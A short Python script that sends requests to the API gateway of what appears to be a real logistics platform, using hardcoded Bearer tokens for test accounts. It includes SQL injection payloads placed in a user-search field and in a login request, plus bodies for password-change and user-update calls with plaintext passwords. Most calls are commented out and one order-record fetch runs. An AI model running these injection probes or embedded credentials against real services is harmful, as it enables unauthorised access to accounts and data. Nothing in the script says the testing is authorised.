import requests
import json

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0',
    'Content-Type': 'application/json;charset=UTF-8',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxNTc3MyIsInVzZXJDb21wYW55TmFtZSI6InRlc3QxMCIsInJvbGVJZHMiOiIyNTYiLCJ1c2VyQ29tcGFueWlkIjoxODQ4LCJtb2R1bGUiOiJxaXllIiwiaXNzIjoid2x5dWFuIiwidXNlck5hbWUiOiJ0ZXN0MTAiLCJleHAiOjE1OTIzODE0MzEsInVzZXJDb2RlIjoiIn0.PqRAYCoiWLFhLCxkKLTk-cvAX_mVJpe5733Vts2eiYk'}
url = 'https://qiye.wlyuan.com.cn/#/CheckOrderDetail?id=2483448&type=CustomerSearchorder&code=7&signType=0'

url2 = 'https://gateway.wlyuan.com.cn/tms/orderIndex/2482222/get'

# res = requests.get(url2, headers=headers)

# print(res.text)

headers = {
    'Accept': 'application/json, text/plain, */*',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxNTc3NCIsInVzZXJDb21wYW55TmFtZSI6InRlc3QxMCIsInJvbGVJZHMiOiI1MTIsMTI4LDMyLDgsMiwxIiwidXNlckNvbXBhbnlpZCI6MTg0OCwidXNlclBob25lIjoiIiwibW9kdWxlIjoicWl5ZSIsImlzcyI6IndseXVhbiIsInVzZXJOYW1lIjoidGVzdDAxIiwiZXhwIjoxNTkyMzg1NzkzLCJ1c2VyQ29kZSI6IiJ9.kd3ee_4SQN3mLURZ0vC3njM9yKX4K3lEeFYw0TsA4qY',
    'Content-Type': 'application/json;charset=UTF-8',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0'
}

url3 = 'https://gateway.wlyuan.com.cn/ams/CompanyManagement/user'
data = {"id":1849,"name":"test0002 OR 1 = 1;-- '","order":"","sortBy":"","user":5,"pageSize":10,"currentPage":1}
# res2 = requests.post(url3, headers=headers, data=json.dumps(data))
# print(res2.text)
# res = requests.get(url2, headers=headers)
# print(res.text) 865@qq.com
data2 = {"userId": "15773", "user": "667@qq.com", "userPassword": "31312323123", "newPassword": "zsl888888",
         "_newPassWord": "zsl888888"}

data3 = {"account": "", "password": "111", "id": 15773, "userId": ""}

url4 = 'https://gateway.wlyuan.com.cn/ams/CompanyManagement/userupdate'

# res4 = requests.post(url4, headers=headers, data=json.dumps(data3))
#
# print(res4.text)


# url5 = 'https://gateway.wlyuan.com.cn/auth/open/login'
# data = {"userAccount":"username' AND 1 = 1 OR '1' = '1","userPassword":""}
# res5 = requests.post(url5, headers=headers, data=json.dumps(data))
# print(res5.text)
url_1 = "https://gateway.wlyuan.com.cn/tms/orderFlow/2483449/get"
res5 = requests.get(url_1, headers=headers)
print(res5.text)